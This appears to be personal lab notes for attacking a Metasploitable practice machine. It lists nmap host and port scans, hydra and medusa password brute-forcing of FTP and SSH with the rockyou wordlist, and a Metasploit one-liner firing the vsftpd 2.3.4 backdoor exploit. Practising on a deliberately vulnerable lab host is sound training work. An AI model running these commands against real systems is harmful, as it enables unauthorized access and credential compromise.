# Find IP
nmap -sn 192.168.10.0/24

# find all ips that are not itself and "host" (192.168.10.x)
nmap  -sn 192.168.10.0/24 --exclude 192.168.10.1,192.168.10.10 | grep "Nmap scan report" | awk '{print $6}'


# Find open ports
nmap -sV -T4 192.168.10.15
nmap -sV -p 21,22,2121 192.168.10.15 | grep "^PORT" -A 100 | grep open | awk '{print $1}' | cut -d'/' -f1

# Attack brute force

  # Brute force FTP
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.15

  # Brute force ssh
medusa -h 192.168.10.15 -P /usr/share/wordlists/rockyou.txt -u msfadmin -M ssh -F -t 4

    # Out put for the pipeline
medusa -h 192.168.10.15 -P /usr/share/wordlists/rockyou.txt -u msfadmin -M ssh -f -t 4 |grep SUCCESS


# VSFTPD
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.10.15; ls; exit"

echo $? # check status last command



# Close ports on metasploitbale.
service ssh stop
